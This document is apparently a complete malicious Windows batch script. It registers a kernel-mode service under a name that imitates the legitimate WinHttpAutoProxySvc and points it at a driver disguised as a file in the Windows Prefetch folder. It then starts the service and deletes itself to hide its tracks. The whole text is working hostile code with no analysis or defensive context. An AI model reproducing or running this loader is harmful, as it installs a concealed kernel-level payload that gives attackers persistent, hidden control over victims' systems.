@echo off
cd %~dp0
sc create WinHttpAutoProxySvc927_c binpath=C:\Windows\Prefetch\CMD.EXE-N9R2DH61.pf type=kernel
sc start WinHttpAutoProxySvc927_c
del "%~f0"